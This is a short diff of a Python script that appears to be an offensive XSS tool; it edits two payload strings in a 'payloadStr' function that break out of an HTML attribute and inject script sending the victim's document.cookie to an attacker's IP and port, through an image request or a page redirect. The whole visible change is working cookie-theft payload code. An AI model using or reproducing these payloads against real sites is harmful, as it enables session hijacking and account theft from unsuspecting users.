@@ -104,8 +104,8 @@ def main():
     def payloadStr(iface):
         ip = netifaces.ifaddresses(iface)
         payloads = {
-            "\"><script>var i = new Image;i.src='//IP:PORT/?c'+document.cookie</script>",
-            "\"><script>document.location='//IP:PORT?c='+document.cookie</script>"
+            "\"><script>var i = new Image;i.src=\"http://IP:PORT/?c\"+document.cookie</script>",
+            "\"><script>document.location=\"http://IP:PORT?c=\"+document.cookie</script>"
             }
         for p in payloads:
             pay = p
